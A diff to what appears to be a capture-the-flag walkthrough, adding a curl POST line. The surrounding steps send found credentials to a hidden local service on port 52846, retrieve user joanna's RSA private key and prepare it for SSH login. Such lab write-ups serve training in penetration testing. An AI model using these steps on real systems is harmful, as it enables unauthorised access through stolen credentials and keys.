@@ -43,6 +43,8 @@ and we find a hidden port open, the 52846
 curl -d "username=jimmy&password=Revealed" -X POST http://localhost:52846/main.php
 
 
+curl -X POST http://localhost:52846/main.php
+
 now we got an rsa key for joanna as the main.php file says. we save it as joanna-id-rsa
 if we do
 $ chmod 600 joanna-id-rsa
